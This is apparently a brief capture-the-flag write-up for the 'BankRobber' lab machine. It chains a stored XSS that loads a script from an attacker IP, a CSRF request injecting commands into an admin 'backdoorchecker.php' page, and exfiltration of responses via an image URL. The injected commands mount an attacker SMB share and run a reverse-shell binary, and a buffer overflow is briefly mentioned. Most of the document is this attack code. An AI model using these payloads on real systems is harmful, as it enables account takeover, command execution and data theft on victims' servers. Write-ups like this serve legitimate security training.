# BankRobber

this box starts of with doing a XSS to gain the admin credentials, and once we gain the admin, again, we use a CSRF to exploit a functionality to gain code execution

XSS Used:

```text
This is on the webpage
<script src="http://10.10.14.28:81/script.js"></script>
```

```text
This is the script.js, used to do CSRF or is this SSRF? idk

var xhr = new XMLHttpRequest();
xhr.open('post', 'http://localhost/admin/backdoorchecker.php', true);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.withCredentials = true;

# couldn't get this piece to work, but including it anyway
xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
        //if (xhr.status === 200 || xhr.status === 302) {
            console.log(xhr.response);
            console.log(xhr.responseText);
        document.write('<img src="http://10.10.14.28:81/abcd?data=' + btoa(xhr.responseText) + btoa(xhr.response)+'" />');
        //}
    }
};

establishing a share on the remote machine
xhr.send('cmd=dir | net use x: \\\\10.10.14.28\\kalishare /user:guest guest ');
#xhr.send('cmd=dir | x:\\shell.exe'); => this gets us reverse shell;
```

after getting a root shell, we see a process on port 910. on a bit usual stuff, its a simple buffer overflow :\)

